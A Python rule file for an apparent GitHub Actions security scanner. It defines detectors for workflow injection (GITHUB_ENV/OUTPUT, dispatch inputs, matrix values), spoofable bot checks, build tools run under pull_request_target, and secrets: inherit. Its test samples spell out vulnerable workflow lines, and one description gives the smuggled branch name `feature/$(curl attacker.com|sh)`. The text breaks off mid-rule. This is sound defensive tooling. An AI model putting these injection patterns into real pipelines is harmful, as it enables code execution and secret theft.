"""GitHub Actions PPE extended rules — GITHUB_ENV/OUTPUT injection, insecure commands,
bot-actor spoofing, LOTP tools, secrets:inherit, if-always-true.

These rules cover attack vectors beyond the basic pull_request_target PPE detection.
Most are directly traceable to documented CVEs and real exploitation campaigns.
"""

from taintly.models import (
    _YAML_BOOL_TRUE,
    ContextPattern,
    PathPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

from .._build_tools import BUILD_TOOL_ANCHOR as _BUILD_TOOL_ANCHOR

RULES: list[Rule] = [
    # =========================================================================
    # SEC4-GH-006: GITHUB_ENV injection — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-006",
        title="Attacker-controlled value written to GITHUB_ENV",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written directly to $GITHUB_ENV. This sets environment variables for ALL "
            "subsequent steps — equivalent to arbitrary code execution. "
            "Any step after this can read the injected variable, including privileged deploy steps."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{\{[^}]*"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]*\}\}[^#\n]*>>\s*\$GITHUB_ENV"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never interpolate attacker-controlled ${{ github.* }} values directly\n"
            "into a run: block that writes to $GITHUB_ENV — they persist across\n"
            "every subsequent step.  Move the value through an env: key and\n"
            "sanitize with Bash parameter expansion at the write site:\n"
            "  env:\n    SAFE_TITLE: ${{ github.event.pull_request.title }}\n"
            '  run: echo "TITLE=${SAFE_TITLE//[^a-zA-Z0-9 _-]/}" >> $GITHUB_ENV\n'
            "Run `taintly --guide SEC4-GH-006` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV',
            '        run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV',
            '        run: echo "BODY=${{ github.event.issue.body }}" >> $GITHUB_ENV',
        ],
        test_negative=[
            '        run: echo "BUILD=production" >> $GITHUB_ENV',
            '        run: echo "TITLE=$SAFE_TITLE" >> $GITHUB_ENV',
            '        # run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV',
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Writing attacker-controlled values to $GITHUB_ENV sets environment variables inherited "
            "by every subsequent step, including privileged deployment steps — equivalent to arbitrary "
            "remote configuration of the entire remaining workflow. "
            "An attacker can inject PATH overrides, LD_PRELOAD values, or tool path overrides to "
            "hijack every command that runs after the injection point."
        ),
        incidents=["Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-007: GITHUB_OUTPUT injection — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-007",
        title="Attacker-controlled value written to GITHUB_OUTPUT",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value written directly to $GITHUB_OUTPUT. "
            "Step outputs can be consumed by subsequent steps and jobs. If a downstream step "
            "uses this output in a shell command or another $GITHUB_ENV write, it enables "
            "chained injection."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{\{[^}]*"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message)|head_ref)"
                r"[^}]*\}\}[^#\n]*>>\s*\$GITHUB_OUTPUT"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Validate and sanitize attacker-controlled values before writing to $GITHUB_OUTPUT.\n"
            "Prefer using env vars as intermediaries and strip shell metacharacters."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "branch=${{ github.head_ref }}" >> $GITHUB_OUTPUT',
            '        run: echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT',
        ],
        test_negative=[
            '        run: echo "result=success" >> $GITHUB_OUTPUT',
            '        run: echo "sha=${{ github.sha }}" >> $GITHUB_OUTPUT',
            '        # run: echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step outputs from attacker-controlled context values propagate to downstream steps "
            "that may use them in shell commands, creating a two-step injection chain that crosses "
            "the step boundary. "
            "The tainted value arrives at the downstream shell command still carrying its original "
            "metacharacters, enabling the same injection as writing the context value directly "
            "into a run: block."
        ),
    ),
    # =========================================================================
    # SEC4-GH-008: workflow_dispatch inputs used directly in run block — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-008",
        title="workflow_dispatch inputs used directly in shell (not via env var)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "workflow_dispatch input values (${{ inputs.* }} or ${{ github.event.inputs.* }}) "
            "used directly in workflow expressions outside of a safe env: assignment. "
            "Manually triggered inputs are user-controlled and may contain shell metacharacters. "
            "Exploited in the Langflow and Ultralytics supply chain incidents (2024-2025)."
        ),
        pattern=RegexPattern(
            match=r"\$\{\{\s*(github\.event\.inputs|inputs)\.[a-zA-Z0-9_]+\s*\}\}",
            exclude=[
                r"^\s*#",
                r"^\s*if:",
                # Exclude lines where ${{ inputs.* }} is the entire value of a YAML key.
                # env: MY_VAR: ${{ inputs.x }} is the RECOMMENDED safe pattern — don't flag it.
                # with: param: ${{ inputs.x }} passes a string to an action, not a shell command.
                r"""^\s*[\w.-]+:\s*["']?\$\{\{[^}]*\}\}["']?\s*(#.*)?$""",
            ],
        ),
        remediation=(
            "Never interpolate ${{ inputs.* }} directly into a run: body\n"
            "— the value is spliced into shell source before parsing, so\n"
            "shell metacharacters execute.  Route through env: and reference\n"
            "as a double-quoted shell var; validate with a case allowlist:\n"
            "  env:\n    MY_INPUT: ${{ inputs.my_input }}\n"
            '  run: case "$MY_INPUT" in staging|prod) ;; *) exit 1;; esac\n'
            "For workflow_dispatch, also set `type: choice` with options.\n"
            "Run `taintly --guide SEC4-GH-008` for the full checklist."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-scripts-to-handle-untrusted-input",
        test_positive=[
            '        run: echo "${{ inputs.user_input }}"',
            "        run: deploy.sh ${{ github.event.inputs.environment }}",
        ],
        test_negative=[
            "        if: inputs.deploy == true",
            '        # run: echo "${{ inputs.user_input }}"',
            '        run: echo "$MY_INPUT"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Workflow dispatch inputs are user-controlled free text that can contain shell "
            "metacharacters, and anyone with workflow dispatch access or a compromised API token "
            "with the workflow scope can supply arbitrary values. "
            "When interpolated directly into a run: block, this creates a command injection path "
            "exploitable by any authorized triggerer — not only external attackers."
        ),
        incidents=["Langflow (2024)", "Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-009: ACTIONS_ALLOW_UNSECURE_COMMANDS re-enabled — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-009",
        title="Insecure workflow commands re-enabled",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "ACTIONS_ALLOW_UNSECURE_COMMANDS=true re-enables the deprecated ::set-env:: and "
            "::add-path:: workflow commands. These were disabled by GitHub in 2020 because "
            "any step that can write to stdout can inject environment variables or PATH entries, "
            "achieving arbitrary code execution. There is no legitimate reason to re-enable this."
        ),
        pattern=RegexPattern(
            match=rf"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*{_YAML_BOOL_TRUE}",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Remove ACTIONS_ALLOW_UNSECURE_COMMANDS entirely. "
            "Use $GITHUB_ENV and $GITHUB_OUTPUT file-based commands instead of ::set-env:: and ::add-path::."
        ),
        reference="https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/",
        test_positive=[
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'",
            "    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: yes",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: on",
        ],
        test_negative=[
            "        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}",
            "        # ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "The ::set-env:: commands were disabled in 2020 because any step that writes to stdout "
            "— including linters, test runners, or external tool output — can inject environment "
            "variables or PATH entries into all subsequent steps. "
            "Re-enabling this turns every tool's standard output into a potential privilege "
            "escalation side channel."
        ),
    ),
    # =========================================================================
    # SEC4-GH-010: Spoofable bot actor condition — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-010",
        title="Security gate uses spoofable github.actor bot check",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses github.actor == 'dependabot[bot]' (or similar) as a security gate "
            "to grant elevated permissions or skip checks. The actor field reflects the LAST "
            "actor to interact, not the PR author. An attacker can push a follow-up commit after "
            "a Dependabot update to inherit the bot's trust level. "
            "Used in confused-deputy attacks and Dependabot auto-merge bypasses."
        ),
        pattern=RegexPattern(
            match=r"github\.actor\s*==\s*['\"]?(dependabot\[bot\]|renovate\[bot\]|github-actions\[bot\])['\"]?",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use github.event.sender.login or check the PR author via github.event.pull_request.user.login. "
            "For Dependabot auto-merge, use the official Dependabot metadata action and verify "
            "update-type, not the actor field."
        ),
        reference="https://woodruffw.github.io/zizmor/audits/bot-conditions/",
        test_positive=[
            "      if: github.actor == 'dependabot[bot]'",
            "      if: github.actor == 'renovate[bot]'",
            '      if: github.actor == "github-actions[bot]"',
        ],
        test_negative=[
            "      if: github.event.pull_request.user.login == 'dependabot[bot]'",
            "      # if: github.actor == 'dependabot[bot]'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "github.actor reflects the last actor to interact with a PR, which can be changed by "
            "pushing a follow-up commit after a trusted bot update, allowing an attacker to inherit "
            "the bot's elevated trust level. "
            "This confused-deputy pattern has been used in Dependabot auto-merge bypasses where "
            "attackers gained repository write access without direct approval."
        ),
    ),
    # =========================================================================
    # SEC4-GH-011: LOTP tools after pull_request_target — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-011",
        title="Living-off-the-pipeline tools run in pull_request_target context",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target AND runs build tools (npm, yarn, pip, make, "
            "gradle, mvn, cargo, bundle) that read attacker-controlled files (package.json, "
            "Makefile, pom.xml, build.gradle, etc.) from the PR branch. "
            "Even without explicit actions/checkout, some tools run lifecycle hooks from "
            "the repository root that can execute arbitrary attacker code. "
            "This pattern was exploited in the Ultralytics supply chain compromise (Dec 2024)."
        ),
        pattern=ContextPattern(
            # Shared build-tool anchor — see taintly/rules/github/_build_tools.py
            # for the full tool list and rationale.  Covers npm/yarn/pnpm
            # (install + user-scripts via run/build/test), pip install (., -e ., -r),
            # python setup.py / -m build, make, cmake, cargo, go, gradle/gradlew,
            # mvn/mvnw, composer, bundle, docker build.
            # `pip install PackageName` is intentionally NOT in the shared anchor
            # because it installs from PyPI and does not read attacker-controlled
            # files.  The shared anchor's `pip install` arm only matches the
            # repo-file-reading forms: `.`, `-e .`, `--editable .`, `-r <file>`.
            anchor=_BUILD_TOOL_ANCHOR,
            requires=r"pull_request_target",
            exclude=[
                r"^\s*#",
                # BUG-8a: exclude "make" in JSON-style YAML string values like "message": "...make..."
                # Lines where the YAML key itself is double-quoted (JSON-style data field)
                # are content, not executable shell commands.
                r"""^\s*"[^"]+"\s*:\s*["']""",
                # BUG-8b: exclude common English phrase "make sure" which appears in PR templates
                # and documentation strings (e.g. Django's new_contributor_pr.yml pr-message: | block).
                r"""\bmake\s+sure\b""",
            ],
            # Suppress findings in jobs explicitly gated to non-PRT events.
            # A job with `if: github.event_name == 'push'` (or schedule, workflow_dispatch,
            # etc.) never runs under pull_request_target, so build tools there cannot
            # be LOTP-exploited. Also covers `!= 'pull_request_target'` forms.
            anchor_job_exclude=(
                r"if:.*github\.event_name\s*==\s*['\"]"
                r"(?:push|schedule|workflow_dispatch|workflow_call|merge_group"
                r"|release|deployment|pull_request)['\"]"
                r"|if:.*github\.event_name\s*!=\s*['\"]pull_request_target['\"]"
            ),
        ),
        remediation=(
            "Do not run build tools in pull_request_target workflows — they\n"
            "execute lifecycle hooks from the PR source tree with your secrets.\n"
            "Use the two-workflow pattern: pull_request for build/test (no\n"
            "secrets), workflow_run for privileged operations that consume\n"
            "only the build artifact (never the PR code).\n"
            "Run `taintly --guide SEC4-GH-011` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - run: npm install && npm test",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pip install -r requirements.txt",
            # pip3 — common on Debian / Ubuntu / pyenv installs.  Was an
            # FN before the pip\d* anchor widening.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pip3 install -e .",
            # poetry install reads pyproject.toml and runs the build
            # backend; attacker-controllable from a PR.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: poetry install",
            # pipx install <local path> — same setup.py / pyproject.toml
            # hook execution as `pip install .`, just with isolation.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pipx install .",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - run: npm install",
            "on:\n  push:\njobs:\n  build:\n    steps:\n      - run: make build",
            # Job guarded to only run on pull_request events — safe even in PRT file
            "on:\n  pull_request_target:\n  pull_request:\njobs:\n  lint:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci && npm run lint",
            # BUG-8a: English prose in JSON-style YAML message field
            'on:\n  pull_request_target:\njobs:\n  manage:\n    steps:\n      - uses: tiangolo/issue-manager@0.6.0\n        with:\n          config: \'{"message": "make sure to read the docs about contributing"}\'\n',
            # BUG-8b: "make sure" English phrase in pr-message block scalar
            "on:\n  pull_request_target:\njobs:\n  greet:\n    steps:\n      - run: echo hi\n        env:\n          MSG: make sure to check the docs\n",
            # pip install of a named PyPI package does NOT read from repo — safe in LOTP context
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip install PyGithub\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip install --upgrade pip\n",
            # pip3 / pipx install of a PyPI name — same reasoning as pip.
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip3 install requests\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pipx install cowsay\n",
            # Poetry read-only / version subcommands don't trigger the build backend.
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: poetry --version\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: poetry show\n",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Build tools like npm install, pip install ., and mvn execute lifecycle scripts defined "
            "in attacker-controlled files (package.json, pyproject.toml, pom.xml) from the PR branch, "
            "giving an external contributor arbitrary code execution in the privileged "
            "pull_request_target context with write access and full secret exposure. "
            "This pattern was exploited in the Ultralytics supply chain compromise (December 2024) "
            "via malicious postinstall hooks."
        ),
        incidents=["Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-012: secrets: inherit in workflow_call — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-012",
        title="secrets: inherit passes all caller secrets to called workflow",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "secrets: inherit passes ALL secrets held by the caller workflow to the called "
            "reusable workflow. Any compromise of the called workflow (or its transitive "
            "dependencies) exposes every secret the caller has access to. "
            "Prefer explicitly listing only the secrets the called workflow actually needs."
        ),
        pattern=RegexPattern(
            match=r"^\s*secrets:\s*inherit\s*(#.*)?$",
            exclude=[r"^\s*#\s"],
        ),
        remediation=(
            "`secrets: inherit` forwards every caller secret to the callee\n"
            "— one compromised transitive action exfiltrates the whole set.\n"
            "Enumerate the callee's actual `${{ secrets.X }}` references,\n"
            "replace with an explicit list, declare them in the callee's\n"
            "`workflow_call: secrets:` block, and pin `uses:` to a SHA:\n"
            "  secrets:\n    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n"
            "Run `taintly --guide SEC4-GH-012` for the full checklist."
        ),
        reference="https://woodruffw.github.io/zizmor/audits/secrets-inherit/",
        test_positive=[
            "      secrets: inherit",
            "        secrets: inherit",
            "      secrets: inherit  # pass all",
        ],
        test_negative=[
            "      secrets:\n        MY_SECRET: ${{ secrets.MY_SECRET }}",
            "      # secrets: inherit",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Passing all secrets to a reusable workflow exposes every credential the caller has "
            "access to, regardless of what the called workflow actually needs. "
            "A single compromised action in the called workflow — or any of its transitive "
            "dependencies — can exfiltrate your entire secret store in one extraction."
        ),
    ),
    # =========================================================================
    # SEC4-GH-013: if: | always evaluates true — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-013",
        title="if: block-scalar condition always evaluates true",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A YAML block-scalar `if: |` makes the entire condition a multi-line string. "
            "In GitHub Actions, a non-empty string always evaluates to true, so this "
            "silently bypasses the access control check. Jobs and steps with this pattern "
            "run unconditionally regardless of the intended condition logic."
        ),
        pattern=SequencePattern(
            # Match `if: |` that is NOT followed (within 8 lines) by any GitHub Actions
            # expression token. Real multi-line expressions like:
            #   if: |
            #     github.event.inputs.foo != 'true'
            #     && github.event.inputs.bar != 'true'
            # work correctly in GitHub Actions (newlines are whitespace in expression parsing).
            # Only flag when the block scalar contains plain prose (no operators/context vars),
            # which always evaluates to true because a non-empty string is truthy.
            pattern_a=r"^\s*if:\s*\|[-+]?\s*(#.*)?$",
            absent_within=(
                r"(?:==|!=|&&|\|\||>=|<=|>|<"
                r"|contains\(|startsWith\(|endsWith\(|format\(|join\(|fromJson\(|toJson\("
                r"|github\.|env\.|vars\.|inputs\.|steps\.|needs\.|runner\.|secrets\.|matrix\."
                r"|always\(\)|success\(\)|failure\(\)|cancelled\(\)"
                r"|\$\{\{)"
            ),
            lookahead_lines=8,
            exclude=[r"^\s*#\s"],
        ),
        remediation=(
            "A YAML block-scalar `if: |` makes the body a non-empty string,\n"
            "which GitHub Actions treats as truthy — the gate silently passes.\n"
            "For multi-line expressions use STRIP-chomp `>-` (not `|` or `>`,\n"
            "both keep a trailing newline); for single-line use plain `if:`:\n"
            "  if: >-\n"
            "    github.event.inputs.foo != 'true'\n"
            "    && github.event.inputs.bar != 'true'\n"
            "Run `taintly --guide SEC4-GH-013` for the full checklist."
        ),
        reference="https://docs.zizmor.sh/audits/if-always-true/",
        test_positive=[
            # Plain string in block scalar — no expression operators — always-true
            "jobs:\n  build:\n    if: |\n      Run this job always\n    runs-on: ubuntu-latest",
            "jobs:\n  test:\n    if: |\n      This description means nothing to GitHub Actions\n    runs-on: ubuntu-latest",
        ],
        test_negative=[
            "      if: github.event_name == 'push'",
            "      if: github.actor != 'bot'",
            "      # if: |",
            # Real multi-line expression — contains operators → should NOT fire
            "jobs:\n  build:\n    if: |\n      github.event.inputs.foo != 'true'\n      && github.event.inputs.bar != 'true'\n    runs-on: ubuntu-latest",
            # Block scalar with github. context variable → should NOT fire
            "jobs:\n  test:\n    if: |\n      github.event_name == 'push'\n    runs-on: ubuntu-latest",
        ],
        stride=["E", "S"],
        threat_narrative=(
            "A non-empty string in a YAML block-scalar always evaluates to true in GitHub Actions' "
            "expression engine, silently bypassing the apparent conditional check and making the "
            "job or step run unconditionally. "
            "The security gate appears present in code review but provides no actual access control "
            "at runtime — an attacker benefits from the gate's removal without any code change."
        ),
    ),
    # =========================================================================
    # SEC4-GH-014: Two-step output injection — attacker context → GITHUB_OUTPUT → run
    # =========================================================================
    Rule(
        id="SEC4-GH-014",
        title="Attacker-controlled value laundered through step output into shell command",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "An attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written to $GITHUB_OUTPUT in one step and then read back via "
            "${{ steps.X.outputs.* }} in a subsequent run: block. "
            "This two-step pattern bypasses direct context injection rules by laundering "
            "the tainted value through a step output. The injection risk is identical to "
            "writing the context value directly into a run: block."
        ),
        pattern=ContextPattern(
            anchor=r"\$\{\{\s*steps\.[a-zA-Z0-9_-]+\.outputs\.",
            requires=(
                r"\$\{\{[^}]*"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]*\}\}[^#\n]*>>\s*\$GITHUB_OUTPUT"
            ),
            exclude=[r"^\s*#"],
            # steps.X.outputs can only reference steps within the same job —
            # cross-job references use needs.job.outputs, not steps.X.outputs.
            # scope="job" prevents FPs where job A writes attacker context to
            # GITHUB_OUTPUT and unrelated job B uses ${{ steps.X.outputs.* }}.
            scope="job",
        ),
        remediation=(
            "Laundering attacker context through `$GITHUB_OUTPUT` doesn't\n"
            "neutralize it — the downstream `run:` still splices the value\n"
            "into shell source.  Sanitize at the WRITE site (apply the\n"
            "SEC4-GH-006 pattern to step A) AND route the consumer through\n"
            "an `env:` key with double-quoted shell expansion:\n"
            "  env:\n    SAFE_VAL: ${{ steps.x.outputs.value }}\n"
            '  run: deploy.sh "$SAFE_VAL"\n'
            "Run `taintly --guide SEC4-GH-014` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            (
                '        run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT\n'
                "        run: deploy.sh ${{ steps.extract.outputs.TITLE }}"
            ),
            (
                '        run: echo "REF=${{ github.head_ref }}" >> $GITHUB_OUTPUT\n'
                "        run: git checkout ${{ steps.getref.outputs.REF }}"
            ),
        ],
        test_negative=[
            # github.sha is a fixed commit hash, not attacker-controlled — not in requires pattern
            (
                '        run: echo "SHA=${{ github.sha }}" >> $GITHUB_OUTPUT\n'
                "        run: git checkout ${{ steps.getsha.outputs.SHA }}"
            ),
            # Step output used safely via env var (anchor matches env line, but that's acceptable
            # — the important thing is the requires pattern does not fire without GITHUB_OUTPUT write)
            '        run: echo "test passed"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Routing attacker-controlled context through a step output before using it in a shell "
            "command launders the tainted value past direct-injection detectors while preserving "
            "the injection risk at the downstream step. "
            "The output write appears benign in isolation; the injection only manifests when the "
            "output is consumed in a run: block, making it harder to detect in code review."
        ),
    ),
    # =========================================================================
    # SEC4-GH-015: Matrix injection from github.event context
    # =========================================================================
    Rule(
        id="SEC4-GH-015",
        title="Build matrix value sourced from attacker-controlled event context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitHub Actions workflow defines a build matrix where at least one "
            "matrix value is sourced directly from the GitHub event context "
            "(github.event.*). "
            "Matrix values are used to parameterise parallel job runs — if an attacker "
            "controls the event payload (e.g. a pull request title, body, or label), "
            "they control what the matrix expands to. Depending on how matrix values "
            "are used in subsequent steps, this can lead to command injection, "
            "arbitrary file writes, or exfiltration of secrets. "
            "The `fromJSON()` pattern is especially dangerous: "
            "`strategy.matrix.include: ${{ fromJSON(github.event.inputs.matrix) }}` "
            "lets an attacker craft a matrix that spawns jobs with arbitrary configurations."
        ),
        pattern=PathPattern(
            path=r"strategy\.matrix\.",
            # github.event_name is NOT attacker-controlled — require github.event.<field>
            value=r"\$\{\{.*github\.event\.[a-zA-Z]",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never source `strategy.matrix` values from `${{ github.event.* }}`\n"
            "— the attacker who controls the payload controls parallel job\n"
            "expansion, including `runs-on:` labels.  Prefer a static list;\n"
            "if dynamism is needed, use `workflow_dispatch` with `type: choice`\n"
            "or a pre-job that emits a matrix from a validated allowlist:\n"
            "  strategy:\n    matrix:\n      os: [ubuntu-latest, windows-latest]\n"
            "Run `taintly --guide SEC4-GH-015` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            "strategy:\n  matrix:\n    config: ${{ fromJSON(github.event.inputs.matrix) }}",
            "strategy:\n  matrix:\n    include: ${{ github.event.pull_request.body }}",
        ],
        test_negative=[
            "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]",
            "strategy:\n  matrix:\n    node: [18, 20, 22]",
            "# strategy:\n#   matrix:\n#     config: ${{ fromJSON(github.event.inputs.x) }}",
            # github.event_name is not attacker-controlled
            "strategy:\n  matrix:\n    skip: ${{ github.event_name == 'pull_request' }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Build matrix values from event context allow an attacker who controls the event payload "
            "to direct parallel jobs to attacker-controlled environments or inject values into "
            "matrix-derived shell commands. "
            "The fromJSON() pattern is the most dangerous form, letting an attacker craft a matrix "
            "that spawns jobs with arbitrary configurations including attacker-controlled runner labels."
        ),
    ),
    # =========================================================================
    # SEC4-GH-016: Reusable workflow caller passes event context to with: params
    # =========================================================================
    Rule(
        id="SEC4-GH-016",
        title="Reusable workflow called with attacker-controlled event context as input",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitHub Actions job calls an external reusable workflow and passes "
            "a value sourced from the event context (github.event.*) as a `with:` "
            "input parameter. "
            "Reusable workflows run with the caller's permissions and secrets. "
            "If the called workflow uses the passed input in a shell step without "
            "sanitization, an attacker who controls the event payload can achieve "
            "command injection inside the reusable workflow — with access to all "
            "secrets available to the caller. "
            "This risk is compounded because the injection point is in a different "
            "repository from where the payload originates."
        ),
        pattern=ContextPattern(
            # github.event_name is the event type (not attacker-controlled)
            # github.event.<field> is the payload (attacker-controlled)
            anchor=r"\$\{\{.*github\.event\.[a-zA-Z]",
            requires=r"uses:\s+[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+/\.github/workflows/",
            exclude=[r"^\s*#"],
            scope="job",
        ),
        remediation=(
            "Reusable workflows run with the caller's secrets — treat their\n"
            "`with:` inputs as a trust boundary.  Never pipe ${{ github.event.* }}\n"
            "straight into a reusable workflow call.  Narrow the value at the\n"
            "caller via `workflow_dispatch` with `type: choice`, and validate\n"
            "again inside the reusable workflow with a Bash `case` allowlist.\n"
            "Pin `uses:` to a full SHA, not a tag.\n"
            "Run `taintly --guide SEC4-GH-016` for the full checklist."
        ),
        reference="https://docs.github.com/en/actions/sharing-automations/reusing-workflows",
        test_positive=[
            (
                "jobs:\n  call:\n"
                "    uses: org/repo/.github/workflows/deploy.yml@abc123\n"
                "    with:\n"
                "      env: ${{ github.event.inputs.environment }}"
            ),
        ],
        test_negative=[
            (
                "jobs:\n  call:\n"
                "    uses: org/repo/.github/workflows/deploy.yml@abc123\n"
                "    with:\n"
                "      env: staging"
            ),
            "      env: ${{ inputs.environment }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Passing event-sourced values to a reusable workflow as with: inputs creates an "
            "injection path that crosses repository boundaries, making it harder to trace and "
            "review in code. "
            "If the called workflow uses the input in a shell step, an attacker who controls the "
            "event payload can inject commands that run with the caller's secrets in a different "
            "repository's workflow context."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4 continued — GitHub auto-populated env vars used unquoted in
    # shell (closes FINDINGS §F-5)
    # =========================================================================
    Rule(
        id="SEC4-GH-018",
        title=(
            "Attacker-controlled GitHub auto-env var used unquoted in shell "
            "(GITHUB_HEAD_REF / GITHUB_REF_NAME / GITHUB_ACTOR)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "GitHub Actions populates `$GITHUB_HEAD_REF`, "
            "`$GITHUB_REF_NAME`, and `$GITHUB_ACTOR` from values the "
            "PR / tag / actor source chooses: anyone who can open a "
            "PR picks the head branch name; anyone with tag-push "
            "access picks the tag name; the actor on a fork-triggered "
            "event is the PR author. Branch and tag names accept "
            "characters that are shell-active (`$`, `(`, `` ` ``, "
            "spaces) when not quoted, so a name like "
            "`feature/$(curl attacker.com|sh)` becomes command "
            "injection wherever the variable is referenced unquoted. "
            "Maintainer-controlled vars like `$GITHUB_BASE_REF` or "
            "`$GITHUB_REPOSITORY_OWNER` are out of scope for this "
            "rule — they're hygiene at most and are covered by "
            "SEC4-GH-020."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?"
            ),
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?GITHUB_",  # YAML key-value assignment
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML value in single-quoted string
                r'^\s*[\w_]+:\s*"[^"]*\$',  # YAML value in double-quoted string
                r"^\s*-?\s*if:",  # if: expressions evaluated by GH engine
                # Double-quoted shell context anywhere on the line — `"$VAR"`
                # preserves word boundaries when passed to echo/printf.
